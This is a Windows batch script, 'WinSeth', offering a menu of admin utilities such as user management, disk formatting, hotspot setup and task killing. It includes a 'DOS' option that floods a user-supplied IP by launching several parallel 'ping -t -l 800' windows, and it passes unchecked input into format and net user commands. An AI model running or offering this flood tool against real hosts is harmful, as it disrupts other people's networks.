@echo off  
:first
set bcolor=0
set fcolor=b
color 0b
:logo
cls
echo.
echo.
echo ____________________________________________________________________________
echo.
echo.
echo oooo     oooo o88                oooooooo8                o8   oooo        
echo  88   88  88  oooo  oo oooooo   888          ooooooooo8 o888oo  888ooooo   
echo   88 888 88    888   888   888   888oooooo  888oooooo8   888    888   888  
echo    888 888     888   888   888          888 888          888    888   888  
echo     8   8     o888o o888o o888o o88oooo888    88oooo888   888o o888o o888o
echo.
echo                                 -----------
echo                                 :by JEckin:
echo                                 -----------
echo.
echo ____________________________________________________________________________
timeout /t 1 /nobreak >nul
goto start

:start0
color %bcolor%%fcolor%
goto start

:Patch
set patch=0
echo ---------------------------------------------------------------:
echo                     -= Patch 25.07.2018 =-                     :
echo ---------------------------------------------------------------:
echo Enter "update" to go to the WinSeth-Update Website
echo Press enter to go to start
set /p patch=
if %patch%==update goto Update
goto start
:start
set o=0
cls
title -=WinSeth=-
echo                                                           Time %time:~0,5%          
echo __________________________________________________________________________
echo.  
echo                   -= Welcome %COMPUTERNAME% to WinSeth =- 
echo __________________________________________________________________________
echo.
echo.  
echo.  
echo.
echo.
echo                               - = Options = -
echo --------------------------------------------------------------------------
echo :    Task-kill   Users    Network    Driver manager      Disk check      :
echo :=====-tkill-===-users-=====-net-=======-drive-============-check-=======:
echo --------------------------------------------------------------------------
echo :    Exit   Dos    Disk Manager   W-lan Hotspot       User Manager       :
echo :====-ex-==-dos-======-diskm-=======-hotspot-===========-userm-==========:
echo --------------------------------------------------------------------------
echo :     Messager    Time Shutdown  Taskmanager  Registry    Services       :
echo :======-msg-=======-shutdown-======-task-=====-regedit-==-services-======:
echo --------------------------------------------------------------------------
echo :       PC-info   Performance monitoring     Disk cleanup     Page 2     :
echo :========-pc-==============-perf-===============-disk-=========-2-=======:
echo --------------------------------------------------------------------------
echo                         :type 'help' to get help:
echo                         -------------------------
set /p o=
if %o%==format goto Format
if %o%==clear goto clear
if %o%==clear goto clear
if %o%==ex exit
if %o%==exit exit
if %o%==aero goto Aero
if %o%==hotspot goto hotspot1
if %o%==userm goto userm
if %o%==net goto network
if %o%==dos goto dos0
if %o%==shutdown goto shutdownmain
if %o%==diskm diskmgmt.msc
if %o%==task goto task 
if %o%==regedit regedit 
if %o%==services services.msc
if %o%==users lusrmgr.msc
if %o%==pc msinfo32
if %o%==perf perfmon.msc
if %o%==disk cleanmgr.exe
if %o%==shutdown1 shutdown -s -t 7200
if %o%==shutdown2 shutdown -s -t 14400
if %o%==drive devmgmt.msc
if %o%==patch goto Patch
if %o%==debugon goto debugon
if %o%==debugoff goto debugoff
if %o%==msg goto Messager
if %o%==tkill goto tkill
if %o%==ip goto ip-ip
if %o%==ping goto ping
if %o%==help goto help
if %o%==cmd start cmd
if %o%==check goto dcheck
if %o%==info goto help
if %o%==fun goto fun
if %o%==winseth goto textartWinSeth
if %o%==hide1 goto whide1
if %o%==hide goto hide0
if %o%==unhide goto unhide0
if %o%==credits goto Credits
if %o%==update goto Update
if %o%==2 goto Page2
goto start
:Page2
set e=0
cls
echo                                                           Time %time:~0,5%          
echo __________________________________________________________________________
echo.  
echo                   -= Welcome %COMPUTERNAME% to WinSeth =- 
echo __________________________________________________________________________
echo.
echo.  
echo.  
echo.
echo.
echo                               - = Options = -
echo --------------------------------------------------------------------------
echo :     Ping       Format        Hide          Fun          Unhide         :
echo :====-ping-=====-format-======-hide-========-fun-=========unhide-========:
echo --------------------------------------------------------------------------
echo :                                                                        :
echo :========================================================================:
echo --------------------------------------------------------------------------
echo :                                                                        :
echo :========================================================================:
echo --------------------------------------------------------------------------
echo :                                                             Page 1     :
echo :==============================================================-1-=======:
echo --------------------------------------------------------------------------
echo                         :type 'help' to get help:
echo                         -------------------------
set /p e=
if %e%==ping goto ping
if %e%==format goto Format
if %e%==hide goto hide0
if %e%==fun goto fun
if %e%==unhide goto unhide0
if %e%==1 goto start
if %e%==help goto help
goto page2

:unhide0
title WinSeth : unhide
cls
set unhide0=0
echo -----------------
echo : 1. WinSeth    :
echo : 2. Custom     :
echo -----------------
echo press enter to get back
set /p unhide0=
if %unhide0%==1 goto whide2
if %unhide0%==2 goto unhide1
goto start
:unhide1
title WinSeth : unhide
cls
set unhide0=0
dir /a
echo -------------------------------------------------
echo :           please write the filename           :
echo :              example: WinSeth.bat             :
echo :the file must be in the folder where is WinSeth:
echo -------------------------------------------------
set /p unhide0=
if %unhide0%==0 goto hide1
if %unhide0%==back goto start0
attrib -h %unhide1%
goto unhide0
:hide0
title WinSeth : hide
cls
set hide0=0
echo -----------------
echo : 1. WinSeth    :
echo : 2. Custom     :
echo -----------------
echo press enter to get back
set /p hide0=
if %hide0%==1 goto whide1
if %hide0%==2 goto hide1
goto start
:hide1
cls
set hide1=0
dir /a
echo -------------------------------------------------
echo :           please write the filename           :
echo :              example: WinSeth.bat             :
echo :the file must be in the folder where is WinSeth:
echo -------------------------------------------------
set /p hide1=
if %hide1%==0 goto hide1
if %hide1%==back goto start0
attrib +h %hide1%
goto hide1
:whide1
cls
attrib +h WinSeth*.bat
echo -----------------------
echo : WinSeth is now hide :
echo -----------------------
timeout /t 1  >nul
goto start0
:whide2
cls
attrib -h WinSeth*.bat
echo -------------------------
echo : WinSeth is now unhide :
echo -------------------------
timeout /t 1  >nul
goto start0
:dcheck
color 0e
cls
title WinSeth : Driver check
set dcheck=0
echo --------------------------------------
echo please run WinSeth as an Administrator
echo --------------------------------------
echo ---------------------------
echo :     type the driver     :
echo :       C,D,E e.t.c.      :
echo ---------------------------
echo press enter to go back
set /p dcheck=
if %dcheck%==0 goto start0
chkdsk %dcheck%:/f/r
goto dcheck

:help
title WinSeth : Help
cls
set hlp=0
echo ---------------------------------------
echo the category:       PC-info
echo the code    :  =======-pc-=======
echo ---------------------------------------
echo write the code to get to the category
echo ---------------------------------------
echo press enter...
echo.
pause>nul
cls
color 0b
echo -------------------------------------------------------------------
echo if the color is cyan you can do it without Administrator 
echo -------------------------------------------------------------------
pause>nul
color 0e
echo.
echo -------------------------------------------------------------------
echo if the color is yellow you need to run winseth as an Administrator
echo -------------------------------------------------------------------
pause>nul
goto start0

:userm
color 0e
title WinSeth : User Manager
cls
echo -------------------------------------------------------------------------------
echo please run WinSeth as an Administrator
echo -------------------------------------------------------------------------------
net user 
set userm=0
echo -------------------------------------------------------------------------------
echo : Create User  Reset Password    User info    :
echo :==-create-=======-passwd-========-info-======:
echo -----------------------------------------------
echo :   user admin    activate/deactivate user    :
echo :====-admin-=============-aduser-=============:
echo -----------------------------------------------
echo : Delete User                                 :
echo :==-delete-===================================:
echo -----------------------------------------------
echo press enter to get back
set /p userm=
if %userm%==0 goto start0
if %userm%==create goto ucreate
if %userm%==passwd goto upasswd
if %userm%==admin goto uadmin
if %userm%==delete goto udelete
if %userm%==info goto uinfo
if %userm%==aduser goto uaduser
goto userm

:uaduser
title WinSeth : Activate/Deactivate User
set uaduser=0
echo ---------------------------
echo :Activate or Deactivate   :
echo :==-a-==========-d-=======:
echo ---------------------------
set /p uaduser=
if %uaduser%==a goto uaduserA
if %uaduser%==d goto uaduserD
goto userm

:uaduserA
cls
net user
title WinSeth : Activate user
set uaduserA=o
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p uaduserA=
net user %uaduserA% /ACTIVE:YES
goto userm

:uaduserD
cls
net user
title WinSeth : Deactivate user
set uaduserA=o
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p uaduserD=
net user %uaduserD% /ACTIVE:NO
goto userm

:ucreate
title WinSeth : Create User
set ucreate=o
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p ucreate=
net user /add %ucreate%
goto userm

:upasswd
title WinSeth : Reset user password
set upasswp=o
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p upasswd=
if %upasswp%===0 goto userm
net user %upasswd% *
goto userm

:uinfo
title WinSeth : User info
set uinfo=0
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p uinfo=
if %uinfo%==0 goto userm
net user %uinfo%
echo press enter...
pause>nul
goto userm

:uadmin
title WinSeth : User Admin
set uadmin=0
echo ----------------------------------
echo : user to admin : user to normal :
echo :=====-y-=============-n-========:
echo ----------------------------------
set /p uadmin=
if %uadmin%==0 goto userm
if %uadmin%==y goto yadmin
if %uadmin%==n goto nadmin
goto uadmin

:yadmin
cls
net user
title WinSeth : User to Admin
set yadmin=0
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p yadmin=
if %yadmin%==0 goto yadmin
net localgroup administratoren /add %yadmin%
goto userm

:nadmin
cls
net localgroup administratoren
title WinSeth : User to Normal
set nadmin=0
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p nadmin=
if %nadmin%==0 goto nadmin
net localgroup administratoren /delete %nadmin%
goto userm

:udelete
title WinSeth : Delete User
set udelete=o
echo ---------------------------
echo :      type the user      :
echo ---------------------------
set /p udelete=
if %udelete%==0 goto userm
net user /delete %udelete%
goto userm

:Setup0
taskmgr
devmgmt.msc
cleanmgr.exe
goto start
:debugon
@echo on
pause>nul
goto start
:debugoff
@echo off
pause>nul
goto start

:ping
title WinSeth : Ping
cls
set png=0
echo ---------------------------------
echo :     Press enter to start      :
echo :   type 'back' to go to menu   :
echo ---------------------------------
echo.
set /p png=
if %png%==0 ping 8.8.8.8 -t
if %png%==back goto start
goto ping
:Messager
title WinSeth : MSG
cls
set fg=0
echo Tipp:it's work only in your network
echo -----------------------------------
echo             Write the IP
echo -----------------------------------
echo       Press enter to go back
echo -----------------------------------
set /p fg=
if %fg%==0 goto start
goto Messager1

:Messager1
cls
set dd=0
echo -------------------------
echo    Write the Messager
echo -------------------------
echo write back to go to start
echo -------------------------
set /p dd=
if %dd%==back goto start
msg * /Server:%fg% "%dd%"
goto Messager1

:task
title WinSeth : Taskmanager
cls
set task=0
echo.
echo                                                           (Beta)
echo ---------------------------------------------------------------:
echo    Windows Taskmg          CMD Taskmg       Task kill          :
echo ====- windows-===============-cmd-===========-kill-============:
echo ---------------------------------------------------------------:
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo. 
set /p task=
if %task%==windows goto twindows
if %task%==cmd goto tcmd
if %task%==kill goto tkill
if %task%==back goto start

:twindows
taskmgr
goto start
:tkill
cls
set tkill=0
tasklist
echo ------------------------------/\--------------------------
echo                      	      PID
echo Enter the PID to kill the task
echo ----------------------------------------------------------
echo Press enter to reload
echo ----------------------------------------------------------
echo Enter "back" to go to Start
echo ----------------------------------------------------------
set /p tkill=
if %tkill%==0 goto tkill
if %tkill%==back goto start

taskkill /PID %tkill% /F

goto tkill
:tcmd
cls
set tcmd=0
tasklist
echo ----------------------------
echo Press enter to reload
echo Enter "back" to go to Start
echo ----------------------------
set /p tcmd=
if %tcmd%==back goto start0
if %tcmd%==exit goto start0
goto tcmd

:Format
title WinSeth : Format
cls
color 0e
set format=0
echo     Please be careful
echo ---------------------------
echo :   Enter a Hard Disk     :
echo :     (C, D, E...)        :
echo ---------------------------
echo if you want back press only enter
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo. 
set /p format=
if %format%==back goto start0
if %format%==0 goto start0
goto Format1

:Format1
cls
set format1=NTFS
echo.
echo Please enter the formatting type
echo press enter for the standard formatting type 
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo. 
set /p format1=
cls
format %format%: /fs:%format1%
goto start0

:Option
goto start0

:hotspotconfig
title WinSeth : Hotspot
cls
echo.
echo --------------------------------------------------
echo Give it a name
echo --------------------------------------------------
set /p wlann=
cls
echo Name: %wlann%
echo --------------------------------------------------
echo password ?
echo --------------------------------------------------
set /p wlanp=
cls
echo --------------------------------------------------
echo Name: %wlann% Pw: %wlanp%
echo --------------------------------------------------
netsh wlan set hostednetwork mode=allow ssid=%wlann% key=%wlanp%
goto hotspot1
:hotspot1
color 0e
set hot=nul
cls
echo --------------------------------------------------
echo please run WinSeth as an Administrator
echo --------------------------------------------------
echo  Name: %wlann% Pw: %wlanp%
echo --------------------------------------------------
echo  Start hotspot -  Stop hotspot     Exit          :
echo ==-start-============-stop-=======-exit-=========:  
echo -------------------------------------------------- 
echo  Configure Hotspot                               :
echo ==-config-=======================================:
echo --------------------------------------------------
set /p hot=
if %hot%==start goto hotspot2
if %hot%==stop goto hotspot3
if %hot%==exit goto start0
if %hot%==config goto hotspotconfig
goto hotspot1
:hotspot2
cls
netsh wlan start hostednetwork 
echo --------------------------------------------------
echo Hotspot will be start
echo --------------------------------------------------
echo press enter..
pause>nul
goto hotspot1
:hotspot3
cls
netsh wlan stop hostednetwork
echo --------------------------------------------------
echo Hotspot has stopped.
echo --------------------------------------------------
echo press enter...
pause>nul
goto hotspot1
:dos0
title WinSeth : DOS
set dos0=0
color 0b
cls
echo --------------------------------------------------
echo Press enter to config the dos
echo Type 'back' to go back
echo --------------------------------------------------
set /p dos0=
if %dos0%==back goto start0
if %dos0%==0 goto dos1
goto dos0
:dosstop
taskkill /IM PING.EXE /F
if %dosx%==5 goto dosstop5
if %dosx%==10 goto dosstop10
goto dos0
:dosstop5
del Dos0.bat
del Dos1.bat
del Dos2.bat
del Dos3.bat
del Dos4.bat
taskkill /IM CMD.EXE /F
goto dos0
:dosstop10
del Dos0.bat
del Dos1.bat
del Dos2.bat
del Dos3.bat
del Dos4.bat
del Dos5.bat
del Dos6.bat
del Dos7.bat
del Dos8.bat
del Dos9.bat
taskkill /IM CMD.EXE /F
goto dos0
:dos3
cls
echo --------------------------------------------------
echo Press enter to cancel the dos
echo -------------------------------------------------- 
pause>nul
goto dosstop
:dos1
set dos=0

title WinSeth : DOS
echo --------------------------------------------------
echo Please enter the IP.
echo -------------------------------------------------- 
set /p dos=
if %dos%==exit goto start0
if %dos%==0 goto dos1
goto dos1.1
:dos1.1
set dosx=0
echo --------------------------------------------------
echo How often dos ? 5x or 10x
echo --------------------------------------------------
set /p dosx=
if %dosx%==5 goto dos5
if %dosx%==10 goto dos10 
if %dosx%==5x goto dos5
if %dosx%==10x goto dos10 
if %dosx%==exit goto start0
if %dosx%==0 goto dos1.1
goto dos1.1
:dos5
cls
title WinSeth : DOS %dos%
echo -----------------------------------------------------
echo Dos to %dos% starting ...
echo    -Beta-
echo -----------------------------------------------------
echo Press enter ...
echo ping %dos% -t -l 800 > Dos0.bat
start Dos0.bat
echo ping %dos% -t -l 800 > Dos1.bat
start Dos1.bat
echo ping %dos% -t -l 800 > Dos2.bat
start Dos2.bat
echo ping %dos% -t -l 800 > Dos3.bat
start Dos3.bat
echo ping %dos% -t -l 800 > Dos4.bat
start Dos4.bat
pause>nul
goto dos3
:dos10
cls
title WinSeth : DOS %dos%
echo -----------------------------------------------------
echo Dos to %dos% starting ...
echo    -Beta-
echo -----------------------------------------------------
echo Press enter ...
echo ping %dos% -t -l 800 > Dos0.bat
start Dos0.bat
echo ping %dos% -t -l 800 > Dos1.bat
start Dos1.bat
echo ping %dos% -t -l 800 > Dos2.bat
start Dos2.bat
echo ping %dos% -t -l 800 > Dos3.bat
start Dos3.bat
echo ping %dos% -t -l 800 > Dos4.bat
start Dos4.bat
echo ping %dos% -t -l 800 > Dos5.bat
start Dos5.bat
echo ping %dos% -t -l 800 > Dos6.bat
start Dos6.bat
echo ping %dos% -t -l 800 > Dos7.bat
start Dos7.bat
echo ping %dos% -t -l 800 > Dos8.bat
start Dos8.bat
echo ping %dos% -t -l 800 > Dos9.bat
start Dos9.bat
pause>nul
goto dos3
:shutdownmain
title WinSeth : Shutdown
cls
set shut=0
echo ------------------------------------
echo 1. Shutdown with time    -time-   :
echo 2. Shutdown menu         -menu-   :
echo 3. Restart PC            -restart-:
echo 4. Cancel a restart      -cancel- :
echo ------------------------------------
echo press enter to get to the start
set /p shut=
if %shut%==time goto shutdowntime
if %shut%==menu goto shutdownmenu
if %shut%==cancel goto shutdowncancel
if %shut%==restart goto shutdownrestart
if %shut%==1 goto shutdowntime
if %shut%==2 goto shutdownmenu
if %shut%==4 goto shutdowncancel
if %shut%==5 goto shutdownrestart
if %shut%==0 goto start0
goto shutdownmain
:shutdownmenu
shutdown -i
echo (Back)
set /p shutmenu=
if %shutmenu%==back goto start 
goto start0
:shutdownrestart
echo -----------------
echo Time in minute(s)
echo -----------------
set /p shutdownsec=
set /a shutdonwrestart= %shutdownsec% *60
shutdown -s -t %shutdownrestart%
shutdown -r -t %shutdownsec%
goto start0
:shutdowntime
cls
echo -----------------
echo Time in minute(s)
echo -----------------
set /p shuts=
set /a shuttime= %shuts% *60 
shutdown -s -t %shuttime%
goto start0
:shutdowncancel
cls
echo -----------------------
echo :      Canceled       :
echo :    press enter...   :
echo -----------------------
shutdown -a 
pause>nul
goto start0  
:network
set ipe=0
cls
echo.
echo choose one...
echo.
echo ----------------------------------------------
echo         My Network IP           Network      :
echo ============-ip-=================-net-=======:  
echo ----------------------------------------------
echo back - press enter...
set /p ipe=
if %ipe%==ip goto ip-ip
if %ipe%==net goto ip-net
if %ipe%==0 goto start0
goto network
:ip-ip
cls
ipconfig
echo ---------------
echo press enter...
pause>nul
goto start0
:ip-net
cls
net user 
pause>nul
goto start0
:Update
cls
start http://bit.ly/winseth-ordner
goto start0
:Credits
title WinSeth : Credits
cls
echo.
echo.
echo ____________________________________________________________________________
echo.
echo.
echo oooo     oooo o88                oooooooo8                o8   oooo        
echo  88   88  88  oooo  oo oooooo   888          ooooooooo8 o888oo  888ooooo   
echo   88 888 88    888   888   888   888oooooo  888oooooo8   888    888   888  
echo    888 888     888   888   888          888 888          888    888   888  
echo     8   8     o888o o888o o888o o88oooo888    88oooo888   888o o888o o888o
echo.
echo                                 -----------
echo                                 :by JEckin:
echo                                 -----------
echo.
echo ____________________________________________________________________________
pause>nul
goto start0
:Aero
cls
set c=0
echo             -works only in Windows 7-
echo --------------------------------------------------
echo             Start with administrator
echo :    Aero stop                Aero start         :
echo :      stop                     start            : 
echo --------------------------------------------------
set /p c=
if %c%==start goto astart
if %c%==stop goto astop
if %c%==0 goto start0
if %c%==back goto start0
goto start0
:fun
title WinSeth : Fun
cls 
set fun=0
echo ------------------------------------
echo : 1. Textart                       :
echo : 2. Fake Hacking                  :
echo : 3. comming soon...               :
echo ------------------------------------
set /p fun=
if %fun%==1 goto textart
if %fun%==2 goto FHacking
goto fun
:FHacking
title Hacking
color 0a
cls
echo Downloading Hack...
echo __________________________________________
echo.
echo.
echo __________________________________________
timeout /t 1 /nobreak >nul
cls
echo Downloading Hack...
echo __________________________________________
echo.
echo ==========
echo __________________________________________
timeout /t 1 /nobreak >nul
cls
echo Downloading Hack...
echo __________________________________________
echo.
echo ==============================
echo __________________________________________
timeout /t 1 /nobreak >nul
cls
echo Downloading Hack...
echo __________________________________________
echo.
echo ==========================================
echo __________________________________________
timeout /t 1 /nobreak >nul
cls
echo Starting Hack...
timeout /t 1 /nobreak >nul
tree
timeout /t 1 /nobreak >nul
net user
timeout /t 1 /nobreak >nul
ipconfig
timeout /t 1 /nobreak >nul
ping 8.8.8.8 -l 8
timeout /t 1 /nobreak >nul
tree
timeout /t 2 /nobreak >nul
cls
color 0c
echo Extraction Virus
echo =====
timeout /t 2 /nobreak >nul
cls
echo Extraction Virus
echo ===========
timeout /t 2 /nobreak >nul
cls
echo Extraction Virus
echo ================
timeout /t 2 /nobreak >nul
cls
echo Starting Virus.bat
timeout /t 2 /nobreak >nul
echo Starting BackDoor.exe
timeout /t 2 /nobreak >nul
echo Delete C:\Windows\SoftwareDistribution\Firewall
timeout /t 1 /nobreak >nul
echo Delete C:\Windows\System32\SystemControl
timeout /t 2 /nobreak >nul
echo Delete C:\Windows\Secret\Important\FileSearch
timeout /t 1 /nobreak >nul
echo Copy Hacks\Keylogger to C:\Windows\System\*
timeout /t 5 /nobreak >nul
cls
echo Computer is hacked
echo please close winseth to the final stage 
echo.
pause>nul
exit
:textart
title WinSeth : Textart
cls
set ta=0
echo ------------------------------------
echo 1. Heart
echo 2. WinSeth
echo ------------------------------------
set /p ta=
if %ta%==1 goto textartheart
if %ta%==2 goto textartWinSeth
goto textart
:textartwinseth
color 0f
cls
echo oooo        
echo  888ooooo   
echo  888   888  
echo  888   888  
echo o888o o888o
timeout /t 1 /nobreak >nul
cls
echo   o8   oooo        
echo o888oo  888ooooo   
echo  888    888   888  
echo  888    888   888  
echo   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo               o8   oooo        
echo  ooooooooo8 o888oo  888ooooo   
echo 888oooooo8   888    888   888  
echo 888          888    888   888  
echo   88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo  oooooooo8                o8   oooo        
echo 888          ooooooooo8 o888oo  888ooooo   
echo  888oooooo  888oooooo8   888    888   888  
echo         888 888          888    888   888  
echo o88oooo888    88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo              oooooooo8                o8   oooo        
echo oo oooooo   888          ooooooooo8 o888oo  888ooooo   
echo  888   888   888oooooo  888oooooo8   888    888   888  
echo  888   888          888 888          888    888   888  
echo o888o o888o o88oooo888    88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo o88                oooooooo8                o8   oooo        
echo oooo  oo oooooo   888          ooooooooo8 o888oo  888ooooo   
echo  888   888   888   888oooooo  888oooooo8   888    888   888  
echo  888   888   888          888 888          888    888   888  
echo o888o o888o o888o o88oooo888    88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo oooo     oooo o88                oooooooo8                o8   oooo        
echo  88   88  88  oooo  oo oooooo   888          ooooooooo8 o888oo  888ooooo   
echo   88 888 88    888   888   888   888oooooo  888oooooo8   888    888   888  
echo    888 888     888   888   888          888 888          888    888   888  
echo     8   8     o888o o888o o888o o88oooo888    88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo   88 888 88    888   888   888   888oooooo  888oooooo8   888    888   888  
echo    888 888     888   888   888          888 888          888    888   888  
echo     8   8     o888o o888o o888o o88oooo888    88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
echo     8   8     o888o o888o o888o o88oooo888    88oooo888   888o o888o o888o
timeout /t 1 /nobreak >nul
cls
timeout /t 1 /nobreak >nul
color 0b
cls
echo  \    /  )(  )  ( \__ \ ) _)  )(   )__( 
echo   \/\/  (__)(_)\_)(___/(___) (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  _    _  __  _  _  ___  ___  ____  _  _ 
echo ( \/\/ )(  )( \( )/ __)(  _)(_  _)( )( )
echo  \    /  )(  )  ( \__ \ ) _)  )(   )__( 
echo   \/\/  (__)(_)\_)(___/(___) (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  __  _  _  ___  ___  ____  _  _ 
echo (  )( \( )/ __)(  _)(_  _)( )( )
echo  )(  )  ( \__ \ ) _)  )(   )__( 
echo (__)(_)\_)(___/(___) (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  _  _  ___  ___  ____  _  _ 
echo ( \( )/ __)(  _)(_  _)( )( )
echo  )  ( \__ \ ) _)  )(   )__( 
echo (_)\_)(___/(___) (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  ___  ___  ____  _  _ 
echo / __)(  _)(_  _)( )( )
echo \__ \ ) _)  )(   )__( 
echo (___/(___) (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  ___  ____  _  _ 
echo (  _)(_  _)( )( )
echo  ) _)  )(   )__( 
echo (___) (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  ____  _  _ 
echo (_  _)( )( )
echo   )(   )__( 
echo  (__) (_)(_)
timeout /t 1 /nobreak >nul
cls
echo  _  _ 
echo ( )( )
echo  )__( 
echo (_)(_)
timeout /t 1 /nobreak >nul
cls
timeout /t 1 /nobreak >nul
goto textartwinseth
:textartheart
color 0c
cls
echo _____8888888888____________________
echo ____888888888888888_________________
echo __888888822222228888________________
timeout /t 1 /nobreak >nul
echo _88888822222222288888_______________
echo 888888222222222228888822228888______
echo 888882222222222222288222222222888___
timeout /t 1 /nobreak >nul
echo 8888822222222222222222222222222288__
echo _8888822222222222222222222222222_88_
echo __88888222222222222222222222222__888
timeout /t 1 /nobreak >nul
echo ___888822222222222222222222222___888
echo ____8888222222222222222222222____888
echo _____8888222222222222222222_____888_
timeout /t 1 /nobreak >nul
echo ______8882222222222222222_____8888__
echo _______888822222222222______888888__
echo ________8888882222______88888888____
timeout /t 1 /nobreak >nul
echo _________888888_____888888888_______
echo __________88888888888888____________
echo ___________8888888888_______________
timeout /t 1 /nobreak >nul
echo ____________8888888_________________
echo _____________88888__________________
echo ______________888___________________
echo _______________8____________________
timeout /t 1 /nobreak >nul
cls
echo _88888822222222288888_______________
echo 888888222222222228888822228888______
echo 888882222222222222288222222222888___
echo 8888822222222222222222222222222288__
echo _8888822222222222222222222222222_88_
echo __88888222222222222222222222222__888
echo ______8882222222222222222_____8888__
echo _______888822222222222______888888__
echo ________8888882222______88888888____
echo _________888888_____888888888_______
echo __________88888888888888____________
echo ___________8888888888_______________
echo ____________8888888_________________
echo _____________88888__________________
echo ______________888___________________
echo _______________8____________________
timeout /t 1 /nobreak >nul
cls
echo _88888822222222288888_______________
echo 888888222222222228888822228888______
echo 888882222222222222288222222222888___
echo ______8882222222222222222_____8888__
echo _______888822222222222______888888__
echo ________8888882222______88888888____
echo _________888888_____888888888_______
echo __________88888888888888____________
echo ___________8888888888_______________
echo ____________8888888_________________
echo _____________88888__________________
echo ______________888___________________
echo _______________8____________________
timeout /t 1 /nobreak >nul
cls
echo ______8882222222222222222_____8888__
echo _______888822222222222______888888__
echo ________8888882222______88888888____
echo _________888888_____888888888_______
echo __________88888888888888____________
echo ___________8888888888_______________
echo ____________8888888_________________
echo _____________88888__________________
echo ______________888___________________
echo _______________8____________________
timeout /t 1 /nobreak >nul
cls
echo _________888888_____888888888_______
echo __________88888888888888____________
echo ___________8888888888_______________
echo ____________8888888_________________
echo _____________88888__________________
echo ______________888___________________
echo _______________8____________________
timeout /t 1 /nobreak >nul
cls
echo ____________8888888_________________
echo _____________88888__________________
echo ______________888___________________
echo _______________8____________________
timeout /t 1 /nobreak >nul
cls
timeout /t 1 /nobreak >nul
goto textartheart
pause>nul
:astart
net start uxsms
goto start0
:astop
net stop uxsms
goto start0

pause>nul